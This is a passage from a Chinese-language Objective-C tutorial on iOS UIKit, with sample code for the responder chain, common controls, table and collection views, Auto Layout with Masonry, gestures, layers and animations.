    <span class="hljs-comment">// 移除通知、释放强引用（避免内存泄漏）</span>

    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@"控制器销毁"</span>);

}

<span class="hljs-keyword">@end</span>

</code></pre>
<h4 data-id="heading-7">3. 响应者体系（UIResponder）</h4>
<p>UIKit 所有可交互元素都继承自 <code>UIResponder</code>（响应者），构成「响应者链」处理事件（触摸、手势、键盘等）：</p>
<ul>
<li>
<p><strong>核心响应者</strong>：<code>UIApplication</code> → <code>UIWindow</code> → <code>UIViewController</code> → <code>UIView</code> → 子视图；</p>
</li>
<li>
<p><strong>核心方法</strong></p>
</li>
</ul>
<pre><code class="hljs language-objc" lang="objc">  <span class="hljs-comment">// 触摸事件</span>
  - (<span class="hljs-type">void</span>)touchesBegan:(<span class="hljs-built_in">NSSet</span>&lt;<span class="hljs-built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="hljs-built_in">UIEvent</span> *)event;
  - (<span class="hljs-type">void</span>)touchesMoved:(<span class="hljs-built_in">NSSet</span>&lt;<span class="hljs-built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="hljs-built_in">UIEvent</span> *)event;
  - (<span class="hljs-type">void</span>)touchesEnded:(<span class="hljs-built_in">NSSet</span>&lt;<span class="hljs-built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="hljs-built_in">UIEvent</span> *)event;
  - (<span class="hljs-type">void</span>)touchesCancelled:(<span class="hljs-built_in">NSSet</span>&lt;<span class="hljs-built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="hljs-built_in">UIEvent</span> *)event;
  <span class="hljs-comment">// 成为第一响应者（如输入框唤起键盘）</span>
  - (<span class="hljs-type">BOOL</span>)becomeFirstResponder;
  <span class="hljs-comment">// 放弃第一响应者（如输入框收起键盘）</span>
  - (<span class="hljs-type">BOOL</span>)resignFirstResponder;
</code></pre>
<ul>
<li><strong>事件传递规则</strong>：</li>
</ul>
<p>  1. 系统通过 <code>hitTest:withEvent:</code> 从父视图到子视图查找「最顶层可交互视图」；</p>
<p>  2. 找到后调用该视图的事件方法（如 <code>touchesBegan:</code>）；</p>
<p>  3. 若该视图不处理，事件沿响应者链向上传递（子视图→父视图→控制器→Window→Application）。</p>
<h4 data-id="heading-8">4. UIView 核心（视图基础）</h4>
<p><code>UIView</code> 是所有可视化元素的基类，负责展示、布局、事件接收，核心属性/方法：</p>













































<table><thead><tr><th>核心属性         </th><th>说明                                                        </th></tr></thead><tbody><tr><td><code>frame</code>          </td><td>相对于父视图的位置+尺寸（CGRect），决定视图在父视图中的显示区域      </td></tr><tr><td><code>bounds</code>         </td><td>自身坐标系的位置+尺寸（origin 默认 (0,0)，修改会偏移子视图）</td></tr><tr><td><code>center</code>         </td><td>相对于父视图的中心点坐标（CGPoint）</td></tr><tr><td><code>transform</code>      </td><td>形变（缩放、旋转、平移，基于 center）</td></tr><tr><td><code>backgroundColor</code></td><td>背景色（UIColor）</td></tr><tr><td><code>alpha</code>          </td><td>透明度（0~1，0 完全透明，1 不透明）</td></tr><tr><td><code>hidden</code>         </td><td>是否隐藏（YES 隐藏，不参与布局/事件）</td></tr><tr><td><code>clipsToBounds</code>  </td><td>是否裁剪超出自身边界的子视图（YES 裁剪）</td></tr><tr><td><code>layer</code>          </td><td>底层 CALayer（负责渲染，UIView 是 CALayer 的封装）</td></tr></tbody></table>
<h3 data-id="heading-9">二、UIKit 核心组件（常用控件）</h3>
<h4 data-id="heading-10">1. 基础交互控件</h4>


















































<table><thead><tr><th>控件类             </th><th>用途                    </th><th>核心 OC 示例</th></tr></thead><tbody><tr><td><code>UILabel</code>          </td><td>文本展示                </td><td><code>UILabel *label = [[UILabel alloc] init]; label.text = @"Hello UIKit"; label.font = [UIFont systemFontOfSize:16];</code></td></tr><tr><td><code>UIButton</code>         </td><td>按钮（点击交互）</td><td><code>UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem]; [btn setTitle:@"点击" forState:UIControlStateNormal]; [btn addTarget:self action:@selector(btnClick:) forControlEvents:UIControlEventTouchUpInside];</code></td></tr><tr><td><code>UITextField</code>      </td><td>单行文本输入            </td><td><code>UITextField *tf = [[UITextField alloc] init]; tf.placeholder = @"请输入内容"; tf.keyboardType = UIKeyboardTypeDefault;</code></td></tr><tr><td><code>UITextView</code>       </td><td>多行文本输入/展示       </td><td><code>UITextView *tv = [[UITextView alloc] init]; tv.text = @"多行文本"; tv.editable = YES;</code></td></tr><tr><td><code>UIImageView</code>      </td><td>图片展示                </td><td><code>UIImageView *iv = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"icon"]]; iv.contentMode = UIViewContentModeScaleAspectFit;</code></td></tr><tr><td><code>UISwitch</code>         </td><td>开关（开/关）</td><td><code>UISwitch *sw = [[UISwitch alloc] init]; sw.on = YES; [sw addTarget:self action:@selector(switchChange:) forControlEvents:UIControlEventValueChanged];</code></td></tr><tr><td><code>UISlider</code>         </td><td>滑块（数值调节）</td><td><code>UISlider *slider = [[UISlider alloc] init]; slider.minimumValue = 0; slider.maximumValue = 100; slider.value = 50;</code></td></tr><tr><td><code>UISegmentedControl</code></td><td>分段选择器              </td><td><code>UISegmentedControl *seg = [[UISegmentedControl alloc] initWithItems:@[@"选项1", @"选项2"]]; seg.selectedSegmentIndex = 0;</code></td></tr></tbody></table>
<h4 data-id="heading-11">2. 列表/集合控件（高频）</h4>
<h5 data-id="heading-12">（1）UITableView（列表）</h5>
<p>核心是「数据源+代理」模式，支持单行列表展示，OC 核心实现：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">TableViewController</span> () &lt;<span class="hljs-title">UITableViewDataSource</span>, <span class="hljs-title">UITableViewDelegate</span>&gt;</span>

<span class="hljs-keyword">@property</span> (<span class="hljs-keyword">nonatomic</span>, <span class="hljs-keyword">strong</span>) <span class="hljs-built_in">UITableView</span> *tableView;

<span class="hljs-keyword">@property</span> (<span class="hljs-keyword">nonatomic</span>, <span class="hljs-keyword">strong</span>) <span class="hljs-built_in">NSArray</span> *dataArray;

<span class="hljs-keyword">@end</span>

<span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">TableViewController</span></span>

- (<span class="hljs-type">void</span>)viewDidLoad {

    [<span class="hljs-variable language_">super</span> viewDidLoad];

    <span class="hljs-keyword">self</span>.dataArray = @[<span class="hljs-string">@"行1"</span>, <span class="hljs-string">@"行2"</span>, <span class="hljs-string">@"行3"</span>];

    <span class="hljs-keyword">self</span>.tableView = [[<span class="hljs-built_in">UITableView</span> alloc] initWithFrame:<span class="hljs-keyword">self</span>.view.bounds style:<span class="hljs-built_in">UITableViewStylePlain</span>];

    <span class="hljs-keyword">self</span>.tableView.dataSource = <span class="hljs-keyword">self</span>;

    <span class="hljs-keyword">self</span>.tableView.delegate = <span class="hljs-keyword">self</span>;

    <span class="hljs-comment">// 注册单元格（复用）</span>

    [<span class="hljs-keyword">self</span>.tableView registerClass:[<span class="hljs-built_in">UITableViewCell</span> <span class="hljs-keyword">class</span>] forCellReuseIdentifier:<span class="hljs-string">@"cellID"</span>];

    [<span class="hljs-keyword">self</span>.view addSubview:<span class="hljs-keyword">self</span>.tableView];

}

<span class="hljs-comment">// 数据源：行数</span>

- (<span class="hljs-built_in">NSInteger</span>)tableView:(<span class="hljs-built_in">UITableView</span> *)tableView numberOfRowsInSection:(<span class="hljs-built_in">NSInteger</span>)section {

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.dataArray.count;

}

<span class="hljs-comment">// 数据源：单元格内容</span>

- (<span class="hljs-built_in">UITableViewCell</span> *)tableView:(<span class="hljs-built_in">UITableView</span> *)tableView cellForRowAtIndexPath:(<span class="hljs-built_in">NSIndexPath</span> *)indexPath {

    <span class="hljs-built_in">UITableViewCell</span> *cell = [tableView dequeueReusableCellWithIdentifier:<span class="hljs-string">@"cellID"</span> forIndexPath:indexPath];

    cell.textLabel.text = <span class="hljs-keyword">self</span>.dataArray[indexPath.row];

    <span class="hljs-keyword">return</span> cell;

}

<span class="hljs-comment">// 代理：单元格点击</span>

- (<span class="hljs-type">void</span>)tableView:(<span class="hljs-built_in">UITableView</span> *)tableView didSelectRowAtIndexPath:(<span class="hljs-built_in">NSIndexPath</span> *)indexPath {

    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@"点击第%ld行"</span>, indexPath.row);

    [tableView deselectRowAtIndexPath:indexPath animated:<span class="hljs-literal">YES</span>];

}

<span class="hljs-keyword">@end</span>

</code></pre>
<h5 data-id="heading-13">（2）UICollectionView（集合视图）</h5>
<p>支持网格、瀑布流等自定义布局，OC 核心实现：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">CollectionViewController</span> () &lt;<span class="hljs-title">UICollectionViewDataSource</span>, <span class="hljs-title">UICollectionViewDelegateFlowLayout</span>&gt;</span>

<span class="hljs-keyword">@property</span> (<span class="hljs-keyword">nonatomic</span>, <span class="hljs-keyword">strong</span>) <span class="hljs-built_in">UICollectionView</span> *collectionView;

<span class="hljs-keyword">@end</span>

<span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">CollectionViewController</span></span>

- (<span class="hljs-type">void</span>)viewDidLoad {

    [<span class="hljs-variable language_">super</span> viewDidLoad];

    <span class="hljs-comment">// 布局配置（流式布局）</span>

    <span class="hljs-built_in">UICollectionViewFlowLayout</span> *layout = [[<span class="hljs-built_in">UICollectionViewFlowLayout</span> alloc] init];

    layout.itemSize = <span class="hljs-built_in">CGSizeMake</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>); <span class="hljs-comment">// 单元格尺寸</span>

    layout.minimumInteritemSpacing = <span class="hljs-number">10</span>; <span class="hljs-comment">// 列间距</span>

    layout.minimumLineSpacing = <span class="hljs-number">10</span>; <span class="hljs-comment">// 行间距</span>

    <span class="hljs-keyword">self</span>.collectionView = [[<span class="hljs-built_in">UICollectionView</span> alloc] initWithFrame:<span class="hljs-keyword">self</span>.view.bounds collectionViewLayout:layout];

    <span class="hljs-keyword">self</span>.collectionView.dataSource = <span class="hljs-keyword">self</span>;

    <span class="hljs-keyword">self</span>.collectionView.delegate = <span class="hljs-keyword">self</span>;

    [<span class="hljs-keyword">self</span>.collectionView registerClass:[<span class="hljs-built_in">UICollectionViewCell</span> <span class="hljs-keyword">class</span>] forCellWithReuseIdentifier:<span class="hljs-string">@"cellID"</span>];

    [<span class="hljs-keyword">self</span>.view addSubview:<span class="hljs-keyword">self</span>.collectionView];

}

<span class="hljs-comment">// 数据源：单元格数量</span>

- (<span class="hljs-built_in">NSInteger</span>)collectionView:(<span class="hljs-built_in">UICollectionView</span> *)collectionView numberOfItemsInSection:(<span class="hljs-built_in">NSInteger</span>)section {
    <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>;
}

<span class="hljs-comment">// 数据源：单元格内容</span>

- (<span class="hljs-built_in">UICollectionViewCell</span> *)collectionView:(<span class="hljs-built_in">UICollectionView</span> *)collectionView cellForItemAtIndexPath:(<span class="hljs-built_in">NSIndexPath</span> *)indexPath {

    <span class="hljs-built_in">UICollectionViewCell</span> *cell = [collectionView dequeueReusableCellWithReuseIdentifier:<span class="hljs-string">@"cellID"</span> forIndexPath:indexPath];

    cell.backgroundColor = [<span class="hljs-built_in">UIColor</span> lightGrayColor];

    <span class="hljs-keyword">return</span> cell;

}

<span class="hljs-keyword">@end</span>

</code></pre>
<h4 data-id="heading-14">3. 容器控件（页面导航/布局）</h4>






























<table><thead><tr><th>控件类                 </th><th>用途                    </th><th>核心 OC 示例                                                                </th></tr></thead><tbody><tr><td><code>UIScrollView</code>         </td><td>可滚动视图（基础）</td><td><code>UIScrollView *scrollView = [[UIScrollView alloc] initWithFrame:self.view.bounds]; scrollView.contentSize = CGSizeMake(375, 1000); scrollView.showsVerticalScrollIndicator = YES;</code></td></tr><tr><td><code>UINavigationController</code></td><td>导航控制器（页面栈）</td><td><code>UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:[[ViewController alloc] init]]; nav.navigationBar.barTintColor = [UIColor blueColor];</code></td></tr><tr><td><code>UITabBarController</code>   </td><td>标签栏控制器（底部切换）</td><td><code>UITabBarController *tabBarVC = [[UITabBarController alloc] init]; tabBarVC.viewControllers = @[nav1, nav2]; tabBarVC.tabBar.tintColor = [UIColor redColor];</code></td></tr><tr><td><code>UIPageViewController</code> </td><td>分页控制器（左右滑切换）</td><td><code>UIPageViewController *pageVC = [[UIPageViewController alloc] initWithTransitionStyle:UIPageViewControllerTransitionStyleScroll navigationOrientation:UIPageViewControllerNavigationOrientationHorizontal options:nil];</code></td></tr></tbody></table>
<h4 data-id="heading-15">4. 弹窗/提示控件</h4>

























<table><thead><tr><th>控件类               </th><th>用途                    </th><th>核心 OC 示例                                                                </th></tr></thead><tbody><tr><td><code>UIAlertController</code>  </td><td>弹窗（警告/操作）</td><td><code>UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"提示" message:@"确定删除？" preferredStyle:UIAlertControllerStyleAlert]; [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDestructive handler:^(UIAlertAction * _Nonnull action) {}]]; [self presentViewController:alert animated:YES completion:nil];</code></td></tr><tr><td><code>UIActivityIndicatorView</code></td><td>加载指示器        </td><td><code>UIActivityIndicatorView *indicator = [[UIActivityIndicatorView alloc] initWithStyle:UIActivityIndicatorViewStyleLarge]; [indicator startAnimating];</code></td></tr><tr><td><code>UIRefreshControl</code>   </td><td>下拉刷新                </td><td><code>UIRefreshControl *refresh = [[UIRefreshControl alloc] init]; [refresh addTarget:self action:@selector(refreshData:) forControlEvents:UIControlEventValueChanged]; self.tableView.refreshControl = refresh;</code></td></tr></tbody></table>
<h3 data-id="heading-16">三、布局体系（UIKit 核心能力）</h3>
<h4 data-id="heading-17">1. 基础布局（Frame/Bounds/Center）</h4>
<p>手动控制视图位置，适合简单布局：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-built_in">UIView</span> *boxView = [[<span class="hljs-built_in">UIView</span> alloc] init];

boxView.frame = <span class="hljs-built_in">CGRectMake</span>(<span class="hljs-number">20</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>); <span class="hljs-comment">// x:20, y:100, 宽100, 高100</span>

boxView.center = <span class="hljs-built_in">CGPointMake</span>(<span class="hljs-number">187.5</span>, <span class="hljs-number">150</span>); <span class="hljs-comment">// 中心点（父视图宽375，水平居中）</span>

boxView.bounds = <span class="hljs-built_in">CGRectMake</span>(<span class="hljs-number">-10</span>, <span class="hljs-number">-10</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>); <span class="hljs-comment">// 自身坐标系偏移，子视图会右移/下移10pt</span>

[<span class="hljs-keyword">self</span>.view addSubview:boxView];

</code></pre>
<h4 data-id="heading-18">2. 自动布局（Auto Layout）</h4>
<p>通过「约束」定义视图关系，适配多屏幕，OC 原生实现：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-built_in">UIButton</span> *btn = [<span class="hljs-built_in">UIButton</span> buttonWithType:<span class="hljs-built_in">UIButtonTypeSystem</span>];

btn.translatesAutoresizingMaskIntoConstraints = <span class="hljs-literal">NO</span>; <span class="hljs-comment">// 必须关闭自动掩码</span>

[<span class="hljs-keyword">self</span>.view addSubview:btn];

<span class="hljs-comment">// 创建约束：按钮左/右间距20pt，顶部100pt，高度44pt</span>

<span class="hljs-built_in">NSLayoutConstraint</span> *leading = [<span class="hljs-built_in">NSLayoutConstraint</span> constraintWithItem:btn attribute:<span class="hljs-built_in">NSLayoutAttributeLeading</span> relatedBy:<span class="hljs-built_in">NSLayoutRelationEqual</span> toItem:<span class="hljs-keyword">self</span>.view attribute:<span class="hljs-built_in">NSLayoutAttributeLeading</span> multiplier:<span class="hljs-number">1.0</span> constant:<span class="hljs-number">20</span>];

<span class="hljs-built_in">NSLayoutConstraint</span> *trailing = [<span class="hljs-built_in">NSLayoutConstraint</span> constraintWithItem:btn attribute:<span class="hljs-built_in">NSLayoutAttributeTrailing</span> relatedBy:<span class="hljs-built_in">NSLayoutRelationEqual</span> toItem:<span class="hljs-keyword">self</span>.view attribute:<span class="hljs-built_in">NSLayoutAttributeTrailing</span> multiplier:<span class="hljs-number">1.0</span> constant:<span class="hljs-number">-20</span>];

<span class="hljs-built_in">NSLayoutConstraint</span> *top = [<span class="hljs-built_in">NSLayoutConstraint</span> constraintWithItem:btn attribute:<span class="hljs-built_in">NSLayoutAttributeTop</span> relatedBy:<span class="hljs-built_in">NSLayoutRelationEqual</span> toItem:<span class="hljs-keyword">self</span>.view attribute:<span class="hljs-built_in">NSLayoutAttributeTop</span> multiplier:<span class="hljs-number">1.0</span> constant:<span class="hljs-number">100</span>];

<span class="hljs-built_in">NSLayoutConstraint</span> *height = [<span class="hljs-built_in">NSLayoutConstraint</span> constraintWithItem:btn attribute:<span class="hljs-built_in">NSLayoutAttributeHeight</span> relatedBy:<span class="hljs-built_in">NSLayoutRelationEqual</span> toItem:<span class="hljs-literal">nil</span> attribute:<span class="hljs-built_in">NSLayoutAttributeNotAnAttribute</span> multiplier:<span class="hljs-number">1.0</span> constant:<span class="hljs-number">44</span>];

<span class="hljs-comment">// 添加约束</span>

[<span class="hljs-keyword">self</span>.view addConstraints:@[leading, trailing, top]];

[btn addConstraint:height];

</code></pre>
<h5 data-id="heading-19">Masonry 封装（OC 主流）</h5>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-meta">#import <span class="hljs-string">"Masonry.h"</span></span>

[btn mas_makeConstraints:^(MASConstraintMaker *make) {

    make.leading.equalTo(<span class="hljs-keyword">self</span>.view).offset(<span class="hljs-number">20</span>);

    make.trailing.equalTo(<span class="hljs-keyword">self</span>.view).offset(<span class="hljs-number">-20</span>);

    make.top.equalTo(<span class="hljs-keyword">self</span>.view).offset(<span class="hljs-number">100</span>);

    make.height.mas_equalTo(<span class="hljs-number">44</span>);

}];

</code></pre>
<h4 data-id="heading-20">3. 尺寸适配（Size Classes + Trait Collection）</h4>
<p>适配多设备/横竖屏，OC 实现：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-comment">// 监听尺寸类变化</span>

- (<span class="hljs-type">void</span>)traitCollectionDidChange:(<span class="hljs-built_in">UITraitCollection</span> *)previousTraitCollection {

    [<span class="hljs-variable language_">super</span> traitCollectionDidChange:previousTraitCollection];

    <span class="hljs-comment">// 宽屏（如iPad/手机横屏）</span>

    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">self</span>.traitCollection.horizontalSizeClass == <span class="hljs-built_in">UIUserInterfaceSizeClassRegular</span>) {

        [<span class="hljs-keyword">self</span>.btn mas_updateConstraints:^(MASConstraintMaker *make) {

            make.height.mas_equalTo(<span class="hljs-number">60</span>);

        }];

    } <span class="hljs-keyword">else</span> { <span class="hljs-comment">// 窄屏（手机竖屏）</span>

        [<span class="hljs-keyword">self</span>.btn mas_updateConstraints:^(MASConstraintMaker *make) {

            make.height.mas_equalTo(<span class="hljs-number">44</span>);

        }];

    }

    [<span class="hljs-keyword">self</span>.view layoutIfNeeded];

}

</code></pre>
<h4 data-id="heading-21">4. 安全区域（Safe Area）</h4>
<p>适配刘海屏/底部横条，OC 实现：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-comment">// 约束适配安全区域</span>

[btn mas_makeConstraints:^(MASConstraintMaker *make) {

    make.leading.equalTo(<span class="hljs-keyword">self</span>.view.safeAreaLayoutGuide).offset(<span class="hljs-number">20</span>);

    make.trailing.equalTo(<span class="hljs-keyword">self</span>.view.safeAreaLayoutGuide).offset(<span class="hljs-number">-20</span>);

    make.top.equalTo(<span class="hljs-keyword">self</span>.view.safeAreaLayoutGuide).offset(<span class="hljs-number">20</span>);

}];

</code></pre>
<h3 data-id="heading-22">四、事件处理（交互核心）</h3>
<h4 data-id="heading-23">1. 触摸事件（UITouch）</h4>
<p>自定义视图触摸处理：</p>
<pre><code class="hljs language-objc" lang="objc">
- (<span class="hljs-type">void</span>)touchesBegan:(<span class="hljs-built_in">NSSet</span>&lt;<span class="hljs-built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="hljs-built_in">UIEvent</span> *)event {

    <span class="hljs-built_in">UITouch</span> *touch = [touches anyObject];

    <span class="hljs-built_in">CGPoint</span> point = [touch locationInView:<span class="hljs-keyword">self</span>.view]; <span class="hljs-comment">// 触摸点坐标</span>

    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@"触摸位置：%@"</span>, <span class="hljs-built_in">NSStringFromCGPoint</span>(point));

}

</code></pre>
<h4 data-id="heading-24">2. 手势识别（UIGestureRecognizer）</h4>
<p>OC 核心示例（点击/长按/滑动）：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-comment">// 点击手势</span>

<span class="hljs-built_in">UITapGestureRecognizer</span> *tap = [[<span class="hljs-built_in">UITapGestureRecognizer</span> alloc] initWithTarget:<span class="hljs-keyword">self</span> action:<span class="hljs-keyword">@selector</span>(tapGesture:)];

tap.numberOfTapsRequired = <span class="hljs-number">1</span>; <span class="hljs-comment">// 点击次数</span>

[<span class="hljs-keyword">self</span>.view addGestureRecognizer:tap];

<span class="hljs-comment">// 长按手势</span>

<span class="hljs-built_in">UILongPressGestureRecognizer</span> *longPress = [[<span class="hljs-built_in">UILongPressGestureRecognizer</span> alloc] initWithTarget:<span class="hljs-keyword">self</span> action:<span class="hljs-keyword">@selector</span>(longPressGesture:)];

longPress.minimumPressDuration = <span class="hljs-number">1.0</span>; <span class="hljs-comment">// 长按时长（秒）</span>

[<span class="hljs-keyword">self</span>.view addGestureRecognizer:longPress];


<span class="hljs-comment">// 滑动手势</span>

<span class="hljs-built_in">UISwipeGestureRecognizer</span> *swipe = [[<span class="hljs-built_in">UISwipeGestureRecognizer</span> alloc] initWithTarget:<span class="hljs-keyword">self</span> action:<span class="hljs-keyword">@selector</span>(swipeGesture:)];

swipe.direction = <span class="hljs-built_in">UISwipeGestureRecognizerDirectionRight</span>; <span class="hljs-comment">// 滑动方向</span>

[<span class="hljs-keyword">self</span>.view addGestureRecognizer:swipe];

</code></pre>
<h4 data-id="heading-25">3. 响应者链拦截（hitTest:withEvent:）</h4>
<p>自定义视图可点击区域：</p>
<pre><code class="hljs language-objc" lang="objc">
- (<span class="hljs-built_in">UIView</span> *)hitTest:(<span class="hljs-built_in">CGPoint</span>)point withEvent:(<span class="hljs-built_in">UIEvent</span> *)event {

    <span class="hljs-comment">// 若视图隐藏/透明/不可交互，不响应事件</span>

    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">self</span>.hidden || <span class="hljs-keyword">self</span>.alpha &lt;= <span class="hljs-number">0.01</span> || !<span class="hljs-keyword">self</span>.userInteractionEnabled) {

        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>;

    }

    <span class="hljs-comment">// 检查点是否在视图范围内</span>

    <span class="hljs-keyword">if</span> (![<span class="hljs-keyword">self</span> pointInside:point withEvent:event]) {

        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>;

    }

    <span class="hljs-comment">// 优先返回子视图（倒序遍历，顶层视图优先）</span>

    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">UIView</span> *subview <span class="hljs-keyword">in</span> [<span class="hljs-keyword">self</span>.subviews reverseObjectEnumerator]) {

        <span class="hljs-built_in">CGPoint</span> subPoint = [subview convertPoint:point fromView:<span class="hljs-keyword">self</span>];

        <span class="hljs-built_in">UIView</span> *hitView = [subview hitTest:subPoint withEvent:event];

        <span class="hljs-keyword">if</span> (hitView) {

            <span class="hljs-keyword">return</span> hitView;

        }

    }

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>;

}

</code></pre>
<h3 data-id="heading-26">五、渲染与动画</h3>
<h4 data-id="heading-27">1. 视图渲染（CALayer + drawRect:）</h4>
<h5 data-id="heading-28">（1）CALayer 基础（UIView 底层渲染）</h5>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-comment">// 给视图添加圆角（通过layer）</span>

<span class="hljs-keyword">self</span>.view.layer.cornerRadius = <span class="hljs-number">10</span>;

<span class="hljs-keyword">self</span>.view.layer.masksToBounds = <span class="hljs-literal">YES</span>; <span class="hljs-comment">// 裁剪圆角</span>

<span class="hljs-keyword">self</span>.view.layer.borderWidth = <span class="hljs-number">1.0</span>;

<span class="hljs-keyword">self</span>.view.layer.borderColor = [<span class="hljs-built_in">UIColor</span> grayColor].CGColor;

  


<span class="hljs-comment">// 阴影（注意：masksToBounds=NO 才生效）</span>

<span class="hljs-keyword">self</span>.view.layer.shadowColor = [<span class="hljs-built_in">UIColor</span> blackColor].CGColor;

<span class="hljs-keyword">self</span>.view.layer.shadowOffset = <span class="hljs-built_in">CGSizeMake</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);

<span class="hljs-keyword">self</span>.view.layer.shadowOpacity = <span class="hljs-number">0.5</span>;

<span class="hljs-keyword">self</span>.view.layer.shadowRadius = <span class="hljs-number">4</span>;

</code></pre>
<h5 data-id="heading-29">（2）自定义绘制（drawRect:）</h5>
<pre><code class="hljs language-objc" lang="objc">
- (<span class="hljs-type">void</span>)drawRect:(<span class="hljs-built_in">CGRect</span>)rect {

    <span class="hljs-comment">// 获取绘图上下文</span>

    <span class="hljs-built_in">CGContextRef</span> ctx = <span class="hljs-built_in">UIGraphicsGetCurrentContext</span>();

    <span class="hljs-comment">// 设置画笔颜色</span>

    <span class="hljs-built_in">CGContextSetStrokeColorWithColor</span>(ctx, [<span class="hljs-built_in">UIColor</span> redColor].CGColor);

    <span class="hljs-comment">// 设置线宽</span>

    <span class="hljs-built_in">CGContextSetLineWidth</span>(ctx, <span class="hljs-number">2.0</span>);

    <span class="hljs-comment">// 绘制矩形</span>

    <span class="hljs-built_in">CGContextAddRect</span>(ctx, <span class="hljs-built_in">CGRectMake</span>(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>));

    <span class="hljs-comment">// 绘制路径</span>

    <span class="hljs-built_in">CGContextStrokePath</span>(ctx);

}

</code></pre>
<h4 data-id="heading-30">2. UIView 动画（基础动画）</h4>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-comment">// 平移动画</span>

[<span class="hljs-built_in">UIView</span> animateWithDuration:<span class="hljs-number">0.3</span> animations:^{

    <span class="hljs-keyword">self</span>.btn.center = <span class="hljs-built_in">CGPointMake</span>(<span class="hljs-keyword">self</span>.btn.center.x + <span class="hljs-number">100</span>, <span class="hljs-keyword">self</span>.btn.center.y);

} completion:^(<span class="hljs-type">BOOL</span> finished) {

    <span class="hljs-comment">// 动画完成回调</span>

}];

<span class="hljs-comment">// 组合动画（缩放+旋转）</span>

[<span class="hljs-built_in">UIView</span> animateWithDuration:<span class="hljs-number">0.5</span> delay:<span class="hljs-number">0</span> options:<span class="hljs-built_in">UIViewAnimationOptionCurveEaseInOut</span> animations:^{

    <span class="hljs-keyword">self</span>.btn.transform = <span class="hljs-built_in">CGAffineTransformMakeScale</span>(<span class="hljs-number">1.5</span>, <span class="hljs-number">1.5</span>); <span class="hljs-comment">// 缩放</span>

    <span class="hljs-keyword">self</span>.btn.transform = <span class="hljs-built_in">CGAffineTransformRotate</span>(<span class="hljs-keyword">self</span>.btn.transform, M_PI_4); <span class="hljs-comment">// 旋转45度</span>

} completion:<span class="hljs-literal">nil</span>];

<span class="hljs-comment">// 转场动画</span>

[<span class="hljs-built_in">UIView</span> transitionWithView:<span class="hljs-keyword">self</span>.view duration:<span class="hljs-number">0.5</span> options:<span class="hljs-built_in">UIViewAnimationOptionTransitionFlipFromLeft</span> animations:^{

    [<span class="hljs-keyword">self</span>.view addSubview:<span class="hljs-keyword">self</span>.newView];

} completion:<span class="hljs-literal">nil</span>];

</code></pre>
<h4 data-id="heading-31">3. Core Animation（核心动画，底层）</h4>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-comment">// 关键帧动画（路径动画）</span>

<span class="hljs-built_in">CAKeyframeAnimation</span> *keyFrame = [<span class="hljs-built_in">CAKeyframeAnimation</span> animationWithKeyPath:<span class="hljs-string">@"position"</span>];

<span class="hljs-built_in">CGMutablePathRef</span> path = <span class="hljs-built_in">CGPathCreateMutable</span>();

<span class="hljs-built_in">CGPathMoveToPoint</span>(path, <span class="hljs-literal">NULL</span>, <span class="hljs-number">20</span>, <span class="hljs-number">100</span>);

<span class="hljs-built_in">CGPathAddLineToPoint</span>(path, <span class="hljs-literal">NULL</span>, <span class="hljs-number">355</span>, <span class="hljs-number">100</span>);

<span class="hljs-built_in">CGPathAddLineToPoint</span>(path, <span class="hljs-literal">NULL</span>, <span class="hljs-number">355</span>, <span class="hljs-number">500</span>);

<span class="hljs-built_in">CGPathAddLineToPoint</span>(path, <span class="hljs-literal">NULL</span>, <span class="hljs-number">20</span>, <span class="hljs-number">500</span>);

keyFrame.path = path;

keyFrame.duration = <span class="hljs-number">2.0</span>;

[<span class="hljs-keyword">self</span>.btn.layer addAnimation:keyFrame forKey:<span class="hljs-string">@"keyFrameAnimation"</span>];

</code></pre>
<h3 data-id="heading-32">六、多态适配（暗黑模式/动态字体）</h3>
<h4 data-id="heading-33">1. 暗黑模式（iOS 13+）</h4>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-comment">// 动态颜色（适配暗黑/浅色模式）</span>

<span class="hljs-built_in">UIColor</span> *dynamicColor = [<span class="hljs-built_in">UIColor</span> colorWithDynamicProvider:^<span class="hljs-built_in">UIColor</span> * _Nonnull(<span class="hljs-built_in">UITraitCollection</span> * _Nonnull traitCollection) {

